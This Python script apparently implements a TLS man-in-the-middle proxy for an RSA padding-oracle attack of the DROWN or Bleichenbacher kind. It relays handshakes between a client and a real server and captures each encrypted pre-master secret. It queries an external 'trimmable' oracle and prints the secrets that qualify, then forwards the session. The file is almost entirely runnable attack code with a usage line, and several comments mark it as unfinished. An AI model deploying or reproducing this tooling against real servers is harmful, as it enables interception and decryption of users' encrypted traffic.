#!/usr/bin/env python3

import socket
from tlslite.api import *
from tlslite.constants import ContentType, HandshakeType
from binascii import hexlify
import subprocess
import sys

def handshakeProxy(c_conn, s_conn, oracle):
    s_conn._handshakeStart(client=False)
    c_conn._handshakeStart(client=True)

    s_settings = HandshakeSettings()
    c_settings = HandshakeSettings()


    # CLIENT HELLO          C -> S
    for result in s_conn._getMsg(ContentType.handshake,
                           HandshakeType.client_hello):
        if result in (0,1): yield result
        else: break
    clientHello = result

    c_conn.version = (3, 1) # TODO : Hardcoded version ?

    for result in c_conn._sendMsg(clientHello):
        yield result


    # SERVER HELLO           S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.server_hello):
        if result in (0,1): yield result
        else: break
    serverHello = result

    s_conn.version = serverHello.server_version
    cipherSuite = serverHello.cipher_suite

    for result in s_conn._sendMsg(serverHello):
        yield result


    # CERTIFICATE           S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.certificate,
                           serverHello.certificate_type): # FIXME : we should only allow RSA
        if result in (0,1): yield result
        else: break
    serverCertificate = result

    for result in s_conn._sendMsg(serverCertificate):
        yield result


    # TODO : this part is optional
    # CERTIFICATE REQUEST   S -> C
    if 0:
        for result in c_conn._getMsg(ContentType.handshake,
                               HandshakeType.certificate_request):
            if result in (0,1): yield result
            else: break
        certificate_request = result

        for result in s_conn._sendMsg(certificate_request):
            yield result


    # SERVER HELLO DONE     S -> C
    for result in c_conn._getMsg(ContentType.handshake,
                           HandshakeType.server_hello_done):
        if result in (0,1): yield result
        else: break
    serverHelloDone = result

    for result in s_conn._sendMsg(serverHelloDone):
        yield result

    # TODO : this part is optional
    # CERTIFICATE           C -> S
    if 0:
        for result in s_conn._getMsg(ContentType.handshake,
                               HandshakeType.certificate,
                               serverHello.certificate_type): # FIXME : we should allow anything ?
            if result in (0,1): yield result
            else: break
        clientCertificate = result

        for result in c_conn._sendMsg(clientCertificate):
            yield result


    # CLIENT KEY EXCHANGE   C -> S
    for result in s_conn._getMsg(ContentType.handshake,
                           HandshakeType.client_key_exchange,
                           cipherSuite):
        if result in (0,1): yield result
        else: break
    clientKeyExchange = result

    # Ask the oracle if we continue
    epms = clientKeyExchange.encryptedPreMasterSecret
    if not oracle(epms):
        # YOU SHALL NOT PASS !
        print("You shall not pass")
        return

    print("Found trimmer !")

    print(hexlify(epms).decode())

    # If it's ok, continue
    for result in c_conn._sendMsg(clientKeyExchange):
        yield result


    # Now we don't care about the SSL protocol, we just forward the records
    # No, that doesn't look like the right way to do it.
    try:
        while True:
            for cdata, sdata in zip(c_conn._recordLayer._recordSocket.recv(), s_conn._recordLayer._recordSocket.recv()):
                if cdata in (0, 1):
                    yield cdata
                else:
                    for result in s_conn._recordLayer._recordSocket._sockSendAll(cdata[0].write() + cdata[1]):
                        yield result
                if sdata in (0, 1):
                    yield sdata
                else:
                    for result in c_conn._recordLayer._recordSocket._sockSendAll(sdata[0].write() + sdata[1]):
                        yield result
    except TLSAbruptCloseError:
        pass


if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("Usage: {} listenaddr connectaddr oracleaddr cert".format(sys.argv[0]))
        exit(0)

    # Get parameters
    listenaddr, connectaddr, oracleaddr, cert = sys.argv[1:]
    listenaddr = (listenaddr.rsplit(':', 1)[0], int(listenaddr.rsplit(':', 1)[1]))
    connectaddr = (connectaddr.rsplit(':', 1)[0], int(connectaddr.rsplit(':', 1)[1]))
    oracleaddr = (oracleaddr.rsplit(':', 1)[0], int(oracleaddr.rsplit(':', 1)[1]))

    oracle = lambda epms: not subprocess.call(["./trimmable", '{}:{}'.format(*oracleaddr), cert, hexlify(epms)])

    # Setup server socket
    bindsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    bindsock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    bindsock.bind(listenaddr)
    print("Listening on {}:{}".format(*listenaddr), file=sys.stderr)
    bindsock.listen(1)

    while True:
        # Wait for client
        s_sock, fromaddr = bindsock.accept()
        print("Connection from {}:{}".format(*fromaddr), file=sys.stderr)

        # Open connection to the TLS server
        c_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        c_sock.connect(connectaddr)
        print("Proxying to {}:{}".format(*connectaddr), file=sys.stderr)

        c_sock.setblocking(False)
        s_sock.setblocking(False)

        c_conn = TLSConnection(c_sock)
        s_conn = TLSConnection(s_sock)

        # Proxy the connection
        for res in handshakeProxy(c_conn, s_conn, oracle):
            pass

        c_sock.close()
        s_sock.close()
        print(file=sys.stderr)


